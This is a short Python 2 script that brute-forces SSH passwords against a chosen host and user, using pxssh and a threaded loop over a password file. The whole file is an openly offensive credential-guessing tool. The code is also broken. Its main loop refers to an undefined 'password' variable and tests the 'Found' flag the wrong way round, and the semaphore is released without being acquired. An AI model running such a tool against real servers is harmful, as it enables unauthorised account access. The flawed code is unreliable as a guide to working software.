import optparse
import time
from pexpect import pxssh
from threading import *
maxConnections = 5

connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def connect(host, user, password, release):
	global Found
	global Fails

	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password Found: ' + password
		Found = True
	except Exception, e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		elif 'synchronizing with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:
		if release: connection_lock.release()

def main():
	parser = optparse.OptionParser("usage%prog "+ "-host <target host> -user <user> -password <password list>")
	parser.add_option('-host', dest='host', type='string', help='specify host')
	parser.add_option('-user', dest='user', type='string', help='specify the username')
	parser.add_option('-password', dest='passfile', type='string', help='specify the password file')
	(options, args) = parser.parse_args()
	host = options.host
	passfile = options.passfile
	user = options.user

	if host == None or passfile == None or user == None:
		print options.usage
		exit(0)

	fn = open(passfile, 'r')
	for line in fn.readlines():
		if Found:
			print "[-] Testing: "+str(password)
			t = Thread(target=connect, args=(host, user, password, True))
			child = t.start()

if __name__ == '__main__':
	main()